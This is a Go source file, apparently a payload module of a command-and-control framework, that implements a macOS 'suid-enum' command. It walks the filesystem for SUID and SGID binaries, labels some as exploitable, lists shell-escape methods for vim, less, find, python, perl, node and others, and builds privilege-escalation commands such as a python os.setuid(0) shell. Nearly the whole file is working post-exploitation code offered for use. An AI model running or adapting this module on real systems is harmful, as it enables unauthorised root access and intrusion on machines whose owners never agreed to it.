// server/docker/payloads/Darwin/action_suid_darwin.go

//go:build darwin
// +build darwin

package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
)

// SUIDEnumCommand enumerates SUID binaries on macOS
type SUIDEnumCommand struct{}

func (c *SUIDEnumCommand) Name() string {
	return "suid-enum"
}

func (c *SUIDEnumCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) < 1 {
		return CommandResult{
			Output:   Err(E1),
			ExitCode: 1,
		}
	}

	action := args[0]
	switch action {
	case "find":
		return c.findSUIDBinaries(args[1:])
	case "check":
		if len(args) < 2 {
			return CommandResult{
				Output:   Err(E1),
				ExitCode: 1,
			}
		}
		return c.checkSUIDBinary(args[1])
	case "exploit":
		return c.exploitSUIDBinary(args[1:])
	default:
		return CommandResult{
			Output:   ErrCtx(E21, action),
			ExitCode: 1,
		}
	}
}

// findSUIDBinaries searches for SUID/SGID binaries
func (c *SUIDEnumCommand) findSUIDBinaries(args []string) CommandResult {
	searchPath := "/"

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--path":
			if i+1 < len(args) {
				searchPath = args[i+1]
				i++
			}
		}
	}

	output := fmt.Sprintf("Searching: %s\n", searchPath)

	// Known interesting SUID binaries on macOS
	interestingBinaries := map[string]string{
		"sudo":       "Standard privilege escalation",
		"su":         "Switch user",
		"ping":       "Network diagnostic tool",
		"traceroute": "Network path tool",
		"mount":      "Mount filesystems",
		"umount":     "Unmount filesystems",
		"passwd":     "Change password",
		"chsh":       "Change shell",
		"screen":     "Terminal multiplexer - possible escape",
		"tmux":       "Terminal multiplexer",
		"vim":        "Editor - possible shell escape",
		"nano":       "Editor - possible privilege escalation",
		"less":       "Pager - possible shell escape",
		"more":       "Pager - possible shell escape",
		"man":        "Manual pages - possible shell escape",
		"python":     "Python interpreter - code execution",
		"python2":    "Python 2 interpreter - code execution",
		"python3":    "Python 3 interpreter - code execution",
		"perl":       "Perl interpreter - code execution",
		"ruby":       "Ruby interpreter - code execution",
		"php":        "PHP interpreter - code execution",
		"node":       "Node.js - code execution",
		"docker":     "Container management",
		"git":        "Version control - possible hooks",
		"find":       "File search - command execution via -exec",
		"xargs":      "Command builder - command execution",
		"env":        "Environment manipulation",
		"bash":       "Shell - direct access",
		"sh":         "Shell - direct access",
		"zsh":        "Shell - direct access",
		"ksh":        "Shell - direct access",
		"csh":        "Shell - direct access",
		"tcsh":       "Shell - direct access",
	}

	suidBinaries := []string{}
	sgidBinaries := []string{}
	exploitableBinaries := []string{}

	// Walk the filesystem
	err := filepath.Walk(searchPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			// Skip permission denied errors
			if os.IsPermission(err) {
				return nil
			}
			return nil
		}

		// Skip certain directories for efficiency
		if info.IsDir() {
			name := info.Name()
			if name == ".git" || name == "node_modules" || name == ".Trash" {
				return filepath.SkipDir
			}
		}

		mode := info.Mode()

		// Check for SUID
		if mode&os.ModeSetuid != 0 {
			suidBinaries = append(suidBinaries, path)

			// Check if it's interesting
			baseName := filepath.Base(path)
			if desc, found := interestingBinaries[baseName]; found {
				exploitableBinaries = append(exploitableBinaries,
					fmt.Sprintf("%s - %s", path, desc))
			}
		}

		// Check for SGID
		if mode&os.ModeSetgid != 0 {
			sgidBinaries = append(sgidBinaries, path)
		}

		return nil
	})

	if err != nil {
		output += fmt.Sprintf("Err: %v\n", err)
	}

	// Format output
	output += fmt.Sprintf("\nSUID: %d\n", len(suidBinaries))
	output += fmt.Sprintf("SGID: %d\n", len(sgidBinaries))
	output += fmt.Sprintf("Exploitable: %d\n\n", len(exploitableBinaries))

	if len(exploitableBinaries) > 0 {
		output += "Exploitable:\n"
		for _, binary := range exploitableBinaries {
			output += fmt.Sprintf("  %s\n", binary)
		}
		output += "\n"
	}

	if len(suidBinaries) > 0 {
		output += "SUID:\n"
		for _, binary := range suidBinaries {
			// Get file info for additional details
			if stat, err := os.Stat(binary); err == nil {
				if sys, ok := stat.Sys().(*syscall.Stat_t); ok {
					output += fmt.Sprintf("  %s (uid:%d gid:%d)\n",
						binary, sys.Uid, sys.Gid)
				} else {
					output += fmt.Sprintf("  %s\n", binary)
				}
			}
		}
		output += "\n"
	}

	if len(sgidBinaries) > 0 {
		output += "SGID:\n"
		for _, binary := range sgidBinaries[:min(20, len(sgidBinaries))] {
			output += fmt.Sprintf("  %s\n", binary)
		}
		if len(sgidBinaries) > 20 {
			output += fmt.Sprintf("  ... and %d more\n", len(sgidBinaries)-20)
		}
	}

	return CommandResult{
		Output:      output,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// checkSUIDBinary checks a specific binary for exploitation potential
func (c *SUIDEnumCommand) checkSUIDBinary(binaryPath string) CommandResult {
	output := fmt.Sprintf("Checking: %s\n", binaryPath)

	// Check if file exists
	info, err := os.Stat(binaryPath)
	if err != nil {
		return CommandResult{
			Output:   ErrCtx(E4, binaryPath),
			ExitCode: 1,
		}
	}

	// Check SUID bit
	if info.Mode()&os.ModeSetuid == 0 {
		output += "SUID: no\n"
	} else {
		output += "SUID: yes\n"
	}

	// Get system info
	if sys, ok := info.Sys().(*syscall.Stat_t); ok {
		output += fmt.Sprintf("UID: %d\n", sys.Uid)
		output += fmt.Sprintf("GID: %d\n", sys.Gid)
	}

	output += fmt.Sprintf("Perms: %s\n", info.Mode().String())
	output += fmt.Sprintf("Size: %d\n\n", info.Size())

	// Check for known exploitation methods
	baseName := filepath.Base(binaryPath)
	output += c.getExploitationMethods(baseName)

	// Check shared libraries (macOS uses dylib)
	output += "\nLibs:\n"
	cmd := exec.Command("otool", "-L", binaryPath)
	if dylibOutput, err := cmd.Output(); err == nil {
		lines := strings.Split(string(dylibOutput), "\n")
		for _, line := range lines[1:] { // Skip first line (binary name)
			line = strings.TrimSpace(line)
			if line != "" {
				output += fmt.Sprintf("  %s\n", line)
			}
		}
	}

	// Check for code signing
	output += "\nSig:\n"
	cmd = exec.Command("codesign", "-dv", binaryPath)
	if sigOutput, err := cmd.CombinedOutput(); err == nil {
		output += string(sigOutput)
	} else {
		output += "  none\n"
	}

	return CommandResult{
		Output:      output,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// getExploitationMethods returns known exploitation methods for common binaries
func (c *SUIDEnumCommand) getExploitationMethods(binaryName string) string {
	methods := map[string][]string{
		"vim": {
			"Shell escape: :!sh",
			"Shell escape: :set shell=/bin/sh then :shell",
			"Python execution: :py import os; os.system('/bin/sh')",
		},
		"less": {
			"Shell escape: !sh",
			"Shell escape: v (opens vi, then :!sh)",
		},
		"more": {
			"Shell escape: !sh",
		},
		"man": {
			"Shell escape: !sh",
			"Shell escape: !/bin/sh",
		},
		"find": {
			"Command execution: find . -exec /bin/sh \\;",
			"Command execution: find . -exec sh -i \\;",
		},
		"python": {
			"Shell: python -c 'import os; os.system(\"/bin/sh\")'",
			"Shell: python -c 'import pty; pty.spawn(\"/bin/sh\")'",
		},
		"python2": {
			"Shell: python2 -c 'import os; os.system(\"/bin/sh\")'",
			"Shell: python2 -c 'import pty; pty.spawn(\"/bin/sh\")'",
		},
		"python3": {
			"Shell: python3 -c 'import os; os.system(\"/bin/sh\")'",
			"Shell: python3 -c 'import pty; pty.spawn(\"/bin/sh\")'",
		},
		"perl": {
			"Shell: perl -e 'exec \"/bin/sh\";'",
		},
		"ruby": {
			"Shell: ruby -e 'exec \"/bin/sh\"'",
		},
		"php": {
			"Shell: php -r 'system(\"/bin/sh\");'",
			"Shell: php -r 'exec(\"/bin/sh\");'",
		},
		"node": {
			"Shell: node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'",
		},
		"screen": {
			"Shell escape: Create new window and run shell",
		},
		"tmux": {
			"Shell escape: Create new window with shell",
		},
		"git": {
			"Hook execution: git hooks",
			"Config execution: git config core.editor /bin/sh",
		},
		"env": {
			"Command execution: env /bin/sh",
		},
	}

	if exploits, found := methods[binaryName]; found {
		output := "Methods:\n"
		for _, method := range exploits {
			output += fmt.Sprintf("  %s\n", method)
		}
		return output
	}

	return "Methods: none\n"
}

// exploitSUIDBinary attempts to exploit a SUID binary
func (c *SUIDEnumCommand) exploitSUIDBinary(args []string) CommandResult {
	var binaryPath string
	var method string

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--binary":
			if i+1 < len(args) {
				binaryPath = args[i+1]
				i++
			}
		case "--method":
			if i+1 < len(args) {
				method = args[i+1]
				i++
			}
		}
	}

	if binaryPath == "" {
		return CommandResult{
			Output:   Err(E1),
			ExitCode: 1,
		}
	}

	output := fmt.Sprintf("Target: %s\n", binaryPath)
	baseName := filepath.Base(binaryPath)

	// Auto-detect method if not specified
	if method == "" {
		method = c.autoDetectMethod(baseName)
		if method == "" {
			return CommandResult{
				Output:   ErrCtx(E4, baseName),
				ExitCode: 1,
			}
		}
		output += fmt.Sprintf("Method: %s\n", method)
	}

	// Build exploitation command based on binary
	var exploitCmd string
	switch baseName {
	case "vim", "vi":
		exploitCmd = fmt.Sprintf("echo ':!sh' | %s", binaryPath)
	case "less", "more", "man":
		exploitCmd = fmt.Sprintf("echo '!sh' | %s /etc/passwd", binaryPath)
	case "find":
		exploitCmd = fmt.Sprintf("%s . -exec /bin/sh \\; -quit", binaryPath)
	case "python", "python2", "python3":
		exploitCmd = fmt.Sprintf("%s -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'", binaryPath)
	case "perl":
		exploitCmd = fmt.Sprintf("%s -e 'exec \"/bin/sh\";'", binaryPath)
	case "ruby":
		exploitCmd = fmt.Sprintf("%s -e 'exec \"/bin/sh\"'", binaryPath)
	case "php":
		exploitCmd = fmt.Sprintf("%s -r 'system(\"/bin/sh\");'", binaryPath)
	case "node":
		exploitCmd = fmt.Sprintf("%s -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'", binaryPath)
	case "env":
		exploitCmd = fmt.Sprintf("%s /bin/sh", binaryPath)
	default:
		return CommandResult{
			Output:   ErrCtx(E4, baseName),
			ExitCode: 1,
		}
	}

	output += fmt.Sprintf("\nCmd:\n%s\n", exploitCmd)

	return CommandResult{
		Output:      output,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// autoDetectMethod automatically determines exploitation method
func (c *SUIDEnumCommand) autoDetectMethod(binaryName string) string {
	methodMap := map[string]string{
		"vim":     "shell-escape",
		"vi":      "shell-escape",
		"less":    "shell-escape",
		"more":    "shell-escape",
		"man":     "shell-escape",
		"find":    "exec",
		"python":  "import",
		"python2": "import",
		"python3": "import",
		"perl":    "exec",
		"ruby":    "exec",
		"php":     "system",
		"node":    "spawn",
		"env":     "direct",
	}

	if method, found := methodMap[binaryName]; found {
		return method
	}
	return ""
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
